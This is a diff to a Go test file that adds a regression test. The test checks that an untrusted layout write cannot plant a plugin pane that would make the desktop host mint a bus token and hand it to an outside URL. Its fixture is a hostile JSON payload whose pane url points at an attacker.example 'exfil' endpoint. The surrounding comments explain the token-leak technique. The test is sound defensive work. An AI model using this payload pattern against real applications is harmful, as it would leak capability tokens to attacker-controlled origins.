@@ -274,6 +274,36 @@ func TestNonTrustedWriterCannotPlantPaneExecution(t *testing.T) {
 	}
 }
 
+// A restored `plugin` pane's `pluginId` makes the desktop's PluginPane MINT a
+// live plugin-scoped bus token and splice it onto the pane's `url` before
+// loading it in the webview. A non-trusted layout.set that set
+// url:"https://attacker/x" + pluginId:"<loaded>" would have the host hand a
+// fresh capability to an attacker origin on restore. `pluginId` is dropped so
+// the pane is un-mintable; `url` is intentionally kept (unauthenticated without
+// the mint, at parity with a browser pane).
+func TestNonTrustedWriterCannotPlantPluginPaneToken(t *testing.T) {
+	s := New(broker.New(), filepath.Join(t.TempDir(), "layout.json"))
+
+	const hostile = `{"agents":[{"id":"a1","cwd":"/","tabs":[` +
+		`{"id":"t1","title":"T","panes":[` +
+		`{"id":"p1","type":"plugin","title":"pl","url":"https://attacker.example/exfil",` +
+		`"pluginId":"djtouchette.shiplight","cwd":"/home/user/project"}]}]}]}`
+
+	if _, err := s.SetAs(untrusted{}, json.RawMessage(`{"data":`+hostile+`}`)); err != nil {
+		t.Fatal(err)
+	}
+	stored := mustStored(t, s)
+	if strings.Contains(stored, "djtouchette.shiplight") {
+		t.Errorf("a non-trusted layout.set kept the plugin pane's pluginId; on restore PluginPane mints a live plugin-scoped bus token against it and splices it onto the pane url, leaking a fresh capability to that origin\n  stored: %s", stored)
+	}
+	// FLOOR: the pane survives (minus the mint gate).
+	for _, keep := range []string{`"id":"p1"`, `"type":"plugin"`, `"id":"t1"`} {
+		if !strings.Contains(stored, keep) {
+			t.Errorf("the pane scrub removed %s — everything that is not the mint gate must round-trip\n  stored: %s", keep, stored)
+		}
+	}
+}
+
 // The desktop mirroring its OWN layout legitimately carries the terminal panes
 // the local user opened, with their own shells. A trusted write must keep them,
 // or the scrub silently rewrites the operator's own layout.
